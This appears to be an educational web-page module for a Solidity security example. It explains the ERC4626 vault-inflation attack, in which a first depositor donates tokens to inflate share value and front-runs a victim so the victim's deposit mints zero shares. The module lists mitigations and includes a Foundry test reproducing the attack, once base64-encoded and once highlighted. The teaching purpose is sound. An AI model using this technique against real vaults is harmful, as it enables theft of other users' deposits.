// metadata
export const version = "0.8.24"
export const title = "Vault Inflation"
export const description = "An example of vault inflation"

export const keywords = ["hack", "security", "inflation", "erc4626", "vault"]

export const codes = [
  {
    fileName: "VaultInflation.sol",
    code: "Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgMC44LjI0OwoKaW1wb3J0IHtUZXN0LCBjb25zb2xlMn0gZnJvbSAiZm9yZ2Utc3RkL1Rlc3Quc29sIjsKaW1wb3J0IHsKICAgIElFUkMyMCwKICAgIFZhdWx0LAogICAgVG9rZW4KfSBmcm9tICIuLi8uLi8uLi9zcmMvaGFja3MvdmF1bHQtaW5mbGF0aW9uL1ZhdWx0SW5mbGF0aW9uLnNvbCI7Cgp1aW50OCBjb25zdGFudCBERUNJTUFMUyA9IDE4OwoKY29udHJhY3QgVmF1bHRUZXN0IGlzIFRlc3QgewogICAgVmF1bHQgcHJpdmF0ZSB2YXVsdDsKICAgIFRva2VuIHByaXZhdGUgdG9rZW47CgogICAgYWRkcmVzc1tdIHByaXZhdGUgdXNlcnMgPSBbYWRkcmVzcygxMSksIGFkZHJlc3MoMTIpXTsKCiAgICBmdW5jdGlvbiBzZXRVcCgpIHB1YmxpYyB7CiAgICAgICAgdG9rZW4gPSBuZXcgVG9rZW4oKTsKICAgICAgICB2YXVsdCA9IG5ldyBWYXVsdChhZGRyZXNzKHRva2VuKSk7CgogICAgICAgIGZvciAodWludDI1NiBpID0gMDsgaSA8IHVzZXJzLmxlbmd0aDsgaSsrKSB7CiAgICAgICAgICAgIHRva2VuLm1pbnQodXNlcnNbaV0sIDEwMDAwICogKDEwICoqIERFQ0lNQUxTKSk7CiAgICAgICAgICAgIHZtLnByYW5rKHVzZXJzW2ldKTsKICAgICAgICAgICAgdG9rZW4uYXBwcm92ZShhZGRyZXNzKHZhdWx0KSwgdHlwZSh1aW50MjU2KS5tYXgpOwogICAgICAgIH0KICAgIH0KCiAgICBmdW5jdGlvbiBwcmludCgpIHByaXZhdGUgewogICAgICAgIGNvbnNvbGUyLmxvZygidmF1bHQgdG90YWwgc3VwcGx5IiwgdmF1bHQudG90YWxTdXBwbHkoKSk7CiAgICAgICAgY29uc29sZTIubG9nKCJ2YXVsdCBiYWxhbmNlIiwgdG9rZW4uYmFsYW5jZU9mKGFkZHJlc3ModmF1bHQpKSk7CiAgICAgICAgdWludDI1NiBzaGFyZXMwID0gdmF1bHQuYmFsYW5jZU9mKHVzZXJzWzBdKTsKICAgICAgICB1aW50MjU2IHNoYXJlczEgPSB2YXVsdC5iYWxhbmNlT2YodXNlcnNbMV0pOwogICAgICAgIGNvbnNvbGUyLmxvZygidXNlcnNbMF0gc2hhcmVzIiwgc2hhcmVzMCk7CiAgICAgICAgY29uc29sZTIubG9nKCJ1c2Vyc1sxXSBzaGFyZXMiLCBzaGFyZXMxKTsKICAgICAgICBjb25zb2xlMi5sb2coInVzZXJzWzBdIHJlZGVlbWFibGUiLCB2YXVsdC5wcmV2aWV3UmVkZWVtKHNoYXJlczApKTsKICAgICAgICBjb25zb2xlMi5sb2coInVzZXJzWzFdIHJlZGVlbWFibGUiLCB2YXVsdC5wcmV2aWV3UmVkZWVtKHNoYXJlczEpKTsKICAgIH0KCiAgICBmdW5jdGlvbiB0ZXN0KCkgcHVibGljIHsKICAgICAgICAvLyB1c2Vyc1swXSBkZXBvc2l0IDEKICAgICAgICBjb25zb2xlMi5sb2coIi0tLSB1c2Vyc1swXSBkZXBvc2l0IC0tLSIpOwogICAgICAgIHZtLnByYW5rKHVzZXJzWzBdKTsKICAgICAgICB2YXVsdC5kZXBvc2l0KDEpOwogICAgICAgIHByaW50KCk7CgogICAgICAgIC8vIHVzZXJzWzBdIGRvbmF0ZSAxMDAKICAgICAgICBjb25zb2xlMi5sb2coIi0tLSB1c2Vyc1swXSBkb25hdGUgLS0tIik7CiAgICAgICAgdm0ucHJhbmsodXNlcnNbMF0pOwogICAgICAgIHRva2VuLnRyYW5zZmVyKGFkZHJlc3ModmF1bHQpLCAxMDAgKiAoMTAgKiogREVDSU1BTFMpKTsKICAgICAgICBwcmludCgpOwoKICAgICAgICAvLyB1c2Vyc1sxXSBkZXBvc2l0IDEwMAogICAgICAgIGNvbnNvbGUyLmxvZygiLS0tIHVzZXJzWzFdIGRlcG9zaXQgLS0tIik7CiAgICAgICAgdm0ucHJhbmsodXNlcnNbMV0pOwogICAgICAgIHZhdWx0LmRlcG9zaXQoMTAwICogKDEwICoqIERFQ0lNQUxTKSk7CiAgICAgICAgcHJpbnQoKTsKICAgIH0KfQo=",
  },
]

const html = `<h3>Vulnerability</h3>
<p>Vault shares can be inflated by donating ERC20 token to the vault.</p>
<p>Attacker can exploit this behavior to steal other user&#39;s deposits.</p>
<h3>Example</h3>
<p>User 0 front runs user 1&#39;s deposit.</p>
<ol>
<li>User 0 deposits <code>1</code>.</li>
<li>User 0 donates <code>100 * 1e18</code>. This inflates the value of each share.</li>
<li>User 1 deposits <code>100 * 1e18</code>. This mints 0 shares to user 1.</li>
<li>User 0 withdraws all <code>200 * 1e18 + 1</code>.</li>
</ol>
<h3>Protections</h3>
<ul>
<li>Min shares -&gt; protects from front running</li>
<li>Internal balance -&gt; protects from donation</li>
<li>Dead shares -&gt; contract is first depositor</li>
<li>Decimal offset (OpenZeppelin ERC4626)</li>
</ul>
<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> 0.8.24;</span>

<span class="hljs-keyword">import</span> {<span class="hljs-title">Test</span>, <span class="hljs-title">console2</span>} <span class="hljs-title"><span class="hljs-keyword">from</span></span> <span class="hljs-string">"forge-std/Test.sol"</span>;
<span class="hljs-keyword">import</span> {
    <span class="hljs-title">IERC20</span>,
    <span class="hljs-title">Vault</span>,
    <span class="hljs-title">Token</span>
} <span class="hljs-title"><span class="hljs-keyword">from</span></span> <span class="hljs-string">"../../../src/hacks/vault-inflation/VaultInflation.sol"</span>;

<span class="hljs-keyword">uint8</span> <span class="hljs-keyword">constant</span> DECIMALS <span class="hljs-operator">=</span> <span class="hljs-number">18</span>;

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">VaultTest</span> <span class="hljs-keyword">is</span> <span class="hljs-title">Test</span> </span>{
    Vault <span class="hljs-keyword">private</span> vault;
    Token <span class="hljs-keyword">private</span> token;

    <span class="hljs-keyword">address</span>[] <span class="hljs-keyword">private</span> users <span class="hljs-operator">=</span> [<span class="hljs-keyword">address</span>(<span class="hljs-number">11</span>), <span class="hljs-keyword">address</span>(<span class="hljs-number">12</span>)];

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setUp</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
        token <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> Token();
        vault <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> Vault(<span class="hljs-keyword">address</span>(token));

        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">uint256</span> i <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i <span class="hljs-operator">&lt;</span> users.<span class="hljs-built_in">length</span>; i<span class="hljs-operator">+</span><span class="hljs-operator">+</span>) {
            token.mint(users[i], <span class="hljs-number">10000</span> <span class="hljs-operator">*</span> (<span class="hljs-number">10</span> <span class="hljs-operator">*</span><span class="hljs-operator">*</span> DECIMALS));
            vm.prank(users[i]);
            token.approve(<span class="hljs-keyword">address</span>(vault), <span class="hljs-keyword">type</span>(<span class="hljs-keyword">uint256</span>).<span class="hljs-built_in">max</span>);
        }
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">print</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">private</span></span> </span>{
        console2.log(<span class="hljs-string">"vault total supply"</span>, vault.totalSupply());
        console2.log(<span class="hljs-string">"vault balance"</span>, token.balanceOf(<span class="hljs-keyword">address</span>(vault)));
        <span class="hljs-keyword">uint256</span> shares0 <span class="hljs-operator">=</span> vault.balanceOf(users[<span class="hljs-number">0</span>]);
        <span class="hljs-keyword">uint256</span> shares1 <span class="hljs-operator">=</span> vault.balanceOf(users[<span class="hljs-number">1</span>]);
        console2.log(<span class="hljs-string">"users[0] shares"</span>, shares0);
        console2.log(<span class="hljs-string">"users[1] shares"</span>, shares1);
        console2.log(<span class="hljs-string">"users[0] redeemable"</span>, vault.previewRedeem(shares0));
        console2.log(<span class="hljs-string">"users[1] redeemable"</span>, vault.previewRedeem(shares1));
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
        <span class="hljs-comment">// users[0] deposit 1</span>
        console2.log(<span class="hljs-string">"--- users[0] deposit ---"</span>);
        vm.prank(users[<span class="hljs-number">0</span>]);
        vault.deposit(<span class="hljs-number">1</span>);
        print();

        <span class="hljs-comment">// users[0] donate 100</span>
        console2.log(<span class="hljs-string">"--- users[0] donate ---"</span>);
        vm.prank(users[<span class="hljs-number">0</span>]);
        token.<span class="hljs-built_in">transfer</span>(<span class="hljs-keyword">address</span>(vault), <span class="hljs-number">100</span> <span class="hljs-operator">*</span> (<span class="hljs-number">10</span> <span class="hljs-operator">*</span><span class="hljs-operator">*</span> DECIMALS));
        print();

        <span class="hljs-comment">// users[1] deposit 100</span>
        console2.log(<span class="hljs-string">"--- users[1] deposit ---"</span>);
        vm.prank(users[<span class="hljs-number">1</span>]);
        vault.deposit(<span class="hljs-number">100</span> <span class="hljs-operator">*</span> (<span class="hljs-number">10</span> <span class="hljs-operator">*</span><span class="hljs-operator">*</span> DECIMALS));
        print();
    }
}
</code></pre>`

export default html
